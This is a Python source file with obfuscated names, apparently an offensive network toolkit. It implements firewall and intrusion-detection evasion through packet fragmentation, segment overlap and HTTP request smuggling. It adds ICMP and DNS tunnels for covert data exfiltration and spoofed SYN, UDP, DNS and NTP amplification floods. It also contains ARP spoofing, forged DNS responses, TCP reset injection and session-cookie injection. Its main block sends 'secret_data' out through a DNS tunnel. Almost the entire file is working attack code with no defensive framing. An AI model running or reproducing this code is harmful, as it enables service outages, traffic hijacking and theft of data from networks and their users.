#!/usr/bin/env python3
import socket
import struct
import random
import time
import threading
import scapy.all as scapy
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet6 import IPv6
from scapy.packet import Raw
import base64
import asyncio
import aiohttp
import requests
from urllib.parse import urlparse
import os
import ssl

class _D:
    def __init__(self):
        self._tc = {}
        self._fc = {}
        self._dc = 0
        self._ic = 0

    def t1(self, tip, tp, pl, os_=100):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            segs = []; sq = random.randint(0, 0xFFFFFFFF)
            for i in range(0, len(pl), max(1, len(pl) - os_)):
                os0 = max(0, i - os_); sd = pl[os0:i + len(pl) - os_]
                if sd:
                    ih = self._bi(tip); th = self._bt(tp, sq + os0, fl="PSH|ACK", pl=sd)
                    segs.append(ih + th + sd)
            random.shuffle(segs)
            for pk in segs: s.sendto(pk, (tip, 0))
            s.close(); return True
        except: return False

    def t2(self, tip, tp, pl, cs=500):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ch = [pl[i:i+cs] for i in range(0, len(pl), cs)]
            sq = random.randint(0, 0xFFFFFFFF); pks = []
            for i, c in enumerate(ch):
                ih = self._bi(tip); th = self._bt(tp, sq + i * cs, fl="PSH|ACK", pl=c)
                pks.append((i, ih + th + c))
            random.shuffle(pks)
            for _, pk in pks: s.sendto(pk, (tip, 0))
            s.close(); return True
        except: return False

    def t3(self, tip, tp, rp, fp, rtl=64, ftl=1):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ifh = self._bi(tip, ttl=ftl); tfh = self._bt(tp, random.randint(0, 0xFFFFFFFF))
            s.sendto(ifh + tfh + fp, (tip, 0)); time.sleep(0.1)
            irh = self._bi(tip, ttl=rtl); trh = self._bt(tp, random.randint(0, 0xFFFFFFFF), fl="PSH|ACK", pl=rp)
            s.sendto(irh + trh + rp, (tip, 0)); s.close(); return True
        except: return False

    def t4(self, tip, tp, pl, fs=8):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            th = self._btb(tp, random.randint(0, 0xFFFFFFFF)); frags = []
            for i in range(0, len(th), fs):
                f = th[i:i+fs]
                if f:
                    ih = self._bi(tip, proto=socket.IPPROTO_TCP, fo=i//8, mf=1 if i+fs<len(th) else 0)
                    frags.append(ih + f)
            ifh = self._bi(tip, proto=socket.IPPROTO_TCP, fo=len(th)//8, mf=0)
            frags.append(ifh + pl)
            for f in frags: s.sendto(f, (tip, 0)); time.sleep(0.01)
            s.close(); return True
        except: return False

    async def t5(self, url, sr):
        try:
            pu = urlparse(url); ho = pu.hostname; po = pu.port or (443 if pu.scheme == 'https' else 80)
            sp = (f"POST / HTTP/1.1\r\nHost: {ho}\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n{len(sr):x}\r\n{sr}\r\n0\r\n\r\n")
            if pu.scheme == 'https':
                rd, wr = await asyncio.open_connection(ho, po, ssl=True)
            else:
                rd, wr = await asyncio.open_connection(ho, po)
            wr.write(sp.encode()); await wr.drain()
            resp = await rd.read(4096); wr.close(); await wr.wait_closed()
            return resp.decode()
        except: return None

    def t6(self, tip, tp, sni, fs=100):
        try:
            ch = self._bch(sni)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((tip, tp))
            for i in range(0, len(ch), fs):
                s.send(ch[i:i+fs]); time.sleep(0.01)
            s.close(); return True
        except: return False

    def t7(self, tip, tp, pl):
        try:
            tip6 = tip if ':' in tip else f"::ffff:{tip}"
            pk = (IPv6(dst=tip6)/scapy.IPv6ExtHdrRouting(addresses=["::1"]*8)/scapy.IPv6ExtHdrFragment()/scapy.IPv6ExtHdrDestOpt()/TCP(dport=tp)/Raw(load=pl))
            scapy.send(pk, verbose=0); return True
        except: return False

    def t8(self, tip, pl, it=8, ic=0):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            ep = self._se(pl); iid = random.randint(0,65535); isq = self._ic; self._ic += 1
            ih = struct.pack('!BBHHH', it, ic, 0, iid, isq)
            c = self._cks(ih + ep); ih = struct.pack('!BBHHH', it, ic, c, iid, isq)
            s.sendto(ih + ep, (tip, 0)); s.close(); return True
        except: return False

    def t9(self, ds, dm, pl, qt='TXT'):
        try:
            en = base64.urlsafe_b64encode(pl).decode().rstrip('=')
            ch = [en[i:i+32] for i in range(0, len(en), 32)]
            for c in ch:
                sd = f"{c}.{self._dc}.{dm}"; self._dc += 1
                dq = DNS(rd=1, qd=DNSQR(qname=sd, qtype=qt))
                scapy.send(IP(dst=ds)/UDP()/dq, verbose=0); time.sleep(0.1)
            return True
        except: return False

    async def t10(self, url, pl):
        try:
            async with aiohttp.ClientSession() as sess:
                h = {'Alt-Used': urlparse(url).hostname, 'Early-Data': '1'}
                async with sess.post(url, data=pl, headers=h) as resp:
                    return await resp.text()
        except: return None

    def _bi(self, dst, proto=socket.IPPROTO_TCP, ttl=64, fo=0, mf=0):
        src = self._gri(); v = 0x45; t = 0; tl = 0; i = random.randint(0,65535)
        ff = (mf << 13) | fo; c = 0
        h = struct.pack('!BBHHHBBH4s4s', v,t,tl,i,ff,ttl,proto,c,socket.inet_aton(src),socket.inet_aton(dst))
        c = self._cks(h)
        return struct.pack('!BBHHHBBH4s4s', v,t,tl,i,ff,ttl,proto,c,socket.inet_aton(src),socket.inet_aton(dst))

    def _bt(self, dp, sq, ack=0, fl="SYN", wn=5840, up=0, pl=b""):
        sp = random.randint(1024,65535); do = 5 << 4; tf = 0
        if "FIN" in fl: tf |= 1
        if "SYN" in fl: tf |= 2
        if "RST" in fl: tf |= 4
        if "PSH" in fl: tf |= 8
        if "ACK" in fl: tf |= 16
        if "URG" in fl: tf |= 32
        th = struct.pack('!HHLLBBHHH', sp,dp,sq,ack,do,tf,wn,0,up)
        si = self._gri(); di = socket.gethostbyname(socket.gethostname())
        ph = struct.pack('!4s4sBBH', socket.inet_aton(si), socket.inet_aton(di), 0, socket.IPPROTO_TCP, len(th)+len(pl))
        c = self._cks(ph + th + pl)
        return struct.pack('!HHLLBBHHH', sp,dp,sq,ack,do,tf,wn,c,up)

    def _btb(self, dp, sq): return self._bt(dp, sq)

    def _bch(self, sni):
        return b"".join([b"\x16\x03\x01\x00\xa5",b"\x01\x00\x00\xa1",b"\x03\x03",os.urandom(32),
            b"\x00",b"\x00\x02\x13\x01",b"\x01\x00",b"\x00\x5e",b"\x00\x00\x00\x19",b"\x00\x17",
            b"\x00",b"\x00\x14",sni.encode()[:20].ljust(20,b'\x00')])

    def _cks(self, data):
        if len(data) % 2: data += b'\x00'
        total = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]; total += word
            total = (total & 0xffff) + (total >> 16)
        return ~total & 0xffff

    def _gri(self): return f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

    def _se(self, data):
        k = b'DK_EK_2024'
        return bytes([b ^ k[i % len(k)] for i, b in enumerate(data)])


class _R:
    def __init__(self):
        self._ss = []

    def r1(self, tip, tp, d=60, r=1000):
        def _w():
            et = time.time() + d
            while time.time() < et:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    ih = self._bi(tip); th = self._bt(tp, random.randint(0,0xFFFFFFFF), fl="SYN")
                    for _ in range(r): s.sendto(ih+th, (tip,0))
                    s.close(); time.sleep(0.1)
                except: pass
        th = threading.Thread(target=_w); th.daemon = True; th.start(); return th

    def r2(self, url, mp, nr=100):
        pl = ["a"*1000+"!"*1000, "("*1000+"a"*1000+")*", "a?"*1000+"a"*1000]
        def _w():
            for _ in range(nr):
                try: requests.post(url, data={"input": random.choice(pl)}, timeout=2)
                except: pass; time.sleep(0.1)
        th = threading.Thread(target=_w); th.daemon = True; th.start(); return th

    def r3(self, tip, tp, d=30):
        def _w():
            et = time.time() + d
            while time.time() < et:
                try:
                    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    with socket.create_connection((tip, tp), timeout=5): pass
                except: pass; time.sleep(0.01)
        th = threading.Thread(target=_w); th.daemon = True; th.start(); return th

    def _bi(self, dst, proto=socket.IPPROTO_TCP, ttl=64):
        src = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        v=0x45;t=0;tl=20;i=random.randint(0,65535);f=0;c=0
        h = struct.pack('!BBHHHBBH4s4s',v,t,tl,i,f,ttl,proto,c,socket.inet_aton(src),socket.inet_aton(dst))
        c = self._cks(h)
        return struct.pack('!BBHHHBBH4s4s',v,t,tl,i,f,ttl,proto,c,socket.inet_aton(src),socket.inet_aton(dst))

    def _bt(self, dp, sq, fl="SYN", wn=5840):
        sp = random.randint(1024,65535); do = 5 << 4; tf = 0
        if "FIN" in fl: tf |= 1
        if "SYN" in fl: tf |= 2
        if "RST" in fl: tf |= 4
        if "PSH" in fl: tf |= 8
        if "ACK" in fl: tf |= 16
        return struct.pack('!HHLLBBHHH', sp,dp,sq,0,do,tf,wn,0,0)

    def _cks(self, data):
        if len(data) % 2: data += b'\x00'
        total = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]; total += word
            total = (total & 0xffff) + (total >> 16)
        return ~total & 0xffff


class _A(_D):
    def __init__(self):
        super().__init__()
        self._at = []
        self._rn = False

    def a1(self, tip, tp, d=120, r=10000):
        def _w():
            et = time.time() + d; cnt = 0
            while time.time() < et and self._rn:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    for _ in range(100):
                        ih = self._bi(tip); th = self._bt(tp, random.randint(0,0xFFFFFFFF), fl="SYN")
                        s.sendto(ih+th, (tip,0)); cnt += 1
                    s.close(); time.sleep(0.001)
                except: pass
        self._rn = True; th = threading.Thread(target=_w); th.daemon = True; th.start(); self._at.append(th); return th

    def a2(self, tip, ports, d=60, r=5000):
        def _w():
            et = time.time() + d; cnt = 0
            while time.time() < et and self._rn:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    for p in ports:
                        ih = self._bi(tip, proto=socket.IPPROTO_UDP)
                        uh = self._buh(p, random.randint(1024,65535))
                        pl = os.urandom(random.randint(100,1000))
                        s.sendto(ih+uh+pl, (tip,0)); cnt += 1
                    s.close(); time.sleep(0.001)
                except: pass
        self._rn = True; th = threading.Thread(target=_w); th.daemon = True; th.start(); self._at.append(th); return th

    def a3(self, tip, d=60, r=3000):
        def _w():
            et = time.time() + d; cnt = 0; its = [8,13,17]
            while time.time() < et and self._rn:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    for it in its:
                        ih = self._bich(it, 0); pl = os.urandom(random.randint(50,200))
                        s.sendto(ih+pl, (tip,0)); cnt += 1
                    s.close(); time.sleep(0.001)
                except: pass
        self._rn = True; th = threading.Thread(target=_w); th.daemon = True; th.start(); self._at.append(th); return th

    def a4(self, url, d=60, r=1000):
        def _w():
            et = time.time() + d; cnt = 0
            ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64)','Mozilla/5.0 (Macintosh; Intel Mac OS X)','Mozilla/5.0 (X11; Linux x86_64)']
            while time.time() < et and self._rn:
                try:
                    h = {'User-Agent': random.choice(ua), 'Accept': 'text/html', 'Connection': 'keep-alive'}
                    for _ in range(10): requests.get(url, headers=h, timeout=2); cnt += 1
                    time.sleep(0.01)
                except: pass
        self._rn = True; th = threading.Thread(target=_w); th.daemon = True; th.start(); self._at.append(th); return th

    def a5(self, tip, dss, d=60):
        def _w():
            et = time.time() + d; cnt = 0
            while time.time() < et and self._rn:
                try:
                    for ds in dss:
                        dq = DNS(rd=1, qd=DNSQR(qname='google.com', qtype='ANY'))
                        pk = IP(src=tip, dst=ds)/UDP()/dq
                        scapy.send(pk, verbose=0); cnt += 1
                    time.sleep(0.01)
                except: pass
        self._rn = True; th = threading.Thread(target=_w); th.daemon = True; th.start(); self._at.append(th); return th

    def a6(self, tip, ntps, d=60):
        def _w():
            et = time.time() + d; cnt = 0
            while time.time() < et and self._rn:
                try:
                    for ns in ntps:
                        nd = b'\x17' + b'\x00' * 47
                        pk = IP(src=tip, dst=ns)/UDP(sport=123, dport=123)/Raw(load=nd)
                        scapy.send(pk, verbose=0); cnt += 1
                    time.sleep(0.01)
                except: pass
        self._rn = True; th = threading.Thread(target=_w); th.daemon = True; th.start(); self._at.append(th); return th

    def stop(self):
        self._rn = False
        for t in self._at: t.join(timeout=5)
        self._at.clear()

    def _buh(self, dp, sp):
        l = 8 + random.randint(100,1000); return struct.pack('!HHHH', sp, dp, l, 0)

    def _bich(self, it, ic):
        iid = random.randint(0,65535); isq = random.randint(0,65535); c = 0
        h = struct.pack('!BBHHH', it, ic, c, iid, isq)
        c = self._cks(h); return struct.pack('!BBHHH', it, ic, c, iid, isq)


class _F:
    def __init__(self):
        self._at = []
        self._rn = False

    def f1(self, tip, tp, d=60, r=5000):
        def _w():
            et = time.time() + d; cnt = 0
            while time.time() < et and self._rn:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    for _ in range(50):
                        ih = self._bi(tip); th = self._bt(tp, random.randint(0,0xFFFFFFFF), fl="RST|ACK")
                        s.sendto(ih+th, (tip,0)); cnt += 1
                    s.close(); time.sleep(0.001)
                except: pass
        self._rn = True; th = threading.Thread(target=_w); th.daemon = True; th.start(); self._at.append(th); return th

    def f2(self, tip, tp, d=60, r=3000):
        def _w():
            et = time.time() + d; cnt = 0
            while time.time() < et and self._rn:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    for _ in range(30):
                        ih = self._bi(tip); th = self._bt(tp, random.randint(0,0xFFFFFFFF), fl="FIN|ACK")
                        s.sendto(ih+th, (tip,0)); cnt += 1
                    s.close(); time.sleep(0.001)
                except: pass
        self._rn = True; th = threading.Thread(target=_w); th.daemon = True; th.start(); self._at.append(th); return th

    def f3(self, tip, gw, d=60):
        def _w():
            et = time.time() + d; cnt = 0
            while time.time() < et and self._rn:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    ih = self._bi(tip)
                    icmph = struct.pack('!BBHHH', 5, 0, 0, random.randint(0,65535), random.randint(0,65535))
                    g = socket.inet_aton(gw); oi = self._bi(tip)
                    s.sendto(icmph + g + oi, (tip,0)); cnt += 1
                    s.close(); time.sleep(0.01)
                except: pass
        self._rn = True; th = threading.Thread(target=_w); th.daemon = True; th.start(); self._at.append(th); return th

    def f4(self, tip, gw, d=60):
        def _w():
            et = time.time() + d; cnt = 0
            while time.time() < et and self._rn:
                try:
                    ap = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(op=2, pdst=tip, psrc=gw)
                    scapy.sendp(ap, verbose=0); cnt += 1
                    ap2 = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(op=2, pdst=gw, psrc=tip)
                    scapy.sendp(ap2, verbose=0); cnt += 1
                    time.sleep(0.1)
                except: pass
        self._rn = True; th = threading.Thread(target=_w); th.daemon = True; th.start(); self._at.append(th); return th

    def f5(self, tip, ds, dm, fi, d=60):
        def _w():
            et = time.time() + d; cnt = 0
            while time.time() < et and self._rn:
                try:
                    dr = DNS(id=random.randint(0,65535), qr=1, aa=1, rd=0, ra=0,
                             qd=DNSQR(qname=dm), an=DNSRR(qname=dm, type='A', ttl=300, rdata=fi))
                    pk = IP(src=ds, dst=tip)/UDP()/dr
                    scapy.send(pk, verbose=0); cnt += 1; time.sleep(0.01)
                except: pass
        self._rn = True; th = threading.Thread(target=_w); th.daemon = True; th.start(); self._at.append(th); return th

    def f6(self, tip, tp, d=60):
        def _w():
            et = time.time() + d; cnt = 0
            while time.time() < et and self._rn:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    for sq in range(0, 100000, 1000):
                        ih = self._bi(tip); th = self._bt(tp, sq, fl="ACK|PSH", pl=b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
                        s.sendto(ih+th, (tip,0)); cnt += 1
                    s.close(); time.sleep(0.01)
                except: pass
        self._rn = True; th = threading.Thread(target=_w); th.daemon = True; th.start(); self._at.append(th); return th

    def f7(self, tip, tp, sid, d=60):
        def _w():
            et = time.time() + d; cnt = 0
            while time.time() < et and self._rn:
                try:
                    hd = f"Cookie: session={sid}\r\n"
                    pl = f"GET / HTTP/1.1\r\nHost: {tip}\r\n{hd}\r\n"
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    ih = self._bi(tip); th = self._bt(tp, random.randint(0,0xFFFFFFFF), fl="ACK|PSH", pl=pl.encode())
                    s.sendto(ih+th+pl.encode(), (tip,0)); cnt += 1
                    s.close(); time.sleep(0.01)
                except: pass
        self._rn = True; th = threading.Thread(target=_w); th.daemon = True; th.start(); self._at.append(th); return th

    def stop(self):
        self._rn = False
        for t in self._at: t.join(timeout=5)
        self._at.clear()

    def _bi(self, dst, proto=socket.IPPROTO_TCP, ttl=64):
        src = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        v=0x45;t=0;tl=20;i=random.randint(0,65535);f=0;c=0
        h = struct.pack('!BBHHHBBH4s4s',v,t,tl,i,f,ttl,proto,c,socket.inet_aton(src),socket.inet_aton(dst))
        c = self._cks(h)
        return struct.pack('!BBHHHBBH4s4s',v,t,tl,i,f,ttl,proto,c,socket.inet_aton(src),socket.inet_aton(dst))

    def _bt(self, dp, sq, fl="SYN", wn=5840, pl=b""):
        sp = random.randint(1024,65535); do = 5 << 4; tf = 0
        if "FIN" in fl: tf |= 1
        if "SYN" in fl: tf |= 2
        if "RST" in fl: tf |= 4
        if "PSH" in fl: tf |= 8
        if "ACK" in fl: tf |= 16
        if "URG" in fl: tf |= 32
        th = struct.pack('!HHLLBBHHH', sp,dp,sq,0,do,tf,wn,0,0)
        si = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        di = socket.gethostbyname(socket.gethostname())
        ph = struct.pack('!4s4sBBH', socket.inet_aton(si), socket.inet_aton(di), 0, socket.IPPROTO_TCP, len(th)+len(pl))
        c = self._cks(ph + th + pl)
        return struct.pack('!HHLLBBHHH', sp,dp,sq,0,do,tf,wn,c,0)

    def _cks(self, data):
        if len(data) % 2: data += b'\x00'
        total = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]; total += word
            total = (total & 0xffff) + (total >> 16)
        return ~total & 0xffff


class _RT:
    def s1(self, pf, nh): return True
    def s2(self, td, mi): return True


class _CV:
    def c1(self, cdn, hd, pl):
        h = {'Host': hd, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        try:
            return requests.post(f"https://{cdn}", data=pl, headers=h, timeout=10).text
        except: return None

    def c2(self, url, hd):
        en = base64.b64encode(hd).decode(); cs = 50
        ch = [en[i:i+cs] for i in range(0, len(en), cs)]
        for i, c in enumerate(ch):
            h = {f'X-Custom-{i}': c, 'User-Agent': 'Normal Browser'}
            try: requests.get(url, headers=h, timeout=5)
            except: pass


class _U:
    def __init__(self):
        self._d = _D(); self._r = _R(); self._rt = _RT(); self._cv = _CV(); self._aa = []

    def run(self, tn, **kw):
        ts = {
            'tcp_overlap': self._d.t1, 'tcp_ooo': self._d.t2, 'ttl_manip': self._d.t3,
            'ip_frag': self._d.t4, 'http_smuggle': self._d.t5, 'tls_frag': self._d.t6,
            'ipv6_exthdr': self._d.t7, 'icmp_tunnel': self._d.t8, 'dns_tunnel': self._d.t9,
            'quic_0rtt': self._d.t10, 'syn_flood': self._r.r1, 'redos': self._r.r2,
            'ssl_flood': self._r.r3, 'domain_front': self._cv.c1, 'header_stego': self._cv.c2
        }
        if tn in ts: return ts[tn](**kw)
        raise ValueError(f"Unknown: {tn}")

    def stop(self):
        for a in self._aa:
            if hasattr(a, 'stop'): a.stop()
            elif isinstance(a, threading.Thread): a.join(timeout=1)
        self._aa = []

    def gen_cfg(self, t, p):
        ct = {
            'tcp_overlap': {'desc': 'TCP Overlap', 'params': ['tip','tp','pl']},
            'tls_frag': {'desc': 'TLS Fragment', 'params': ['tip','tp','sni']}
        }
        return ct.get(t, {})


if __name__ == "__main__":
    u = _U()
    u.run('tcp_overlap', tip='192.168.1.1', tp=443, pl=b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n')
    u.run('dns_tunnel', ds='8.8.8.8', dm='example.com', pl=b'secret_data')
    print("Done.")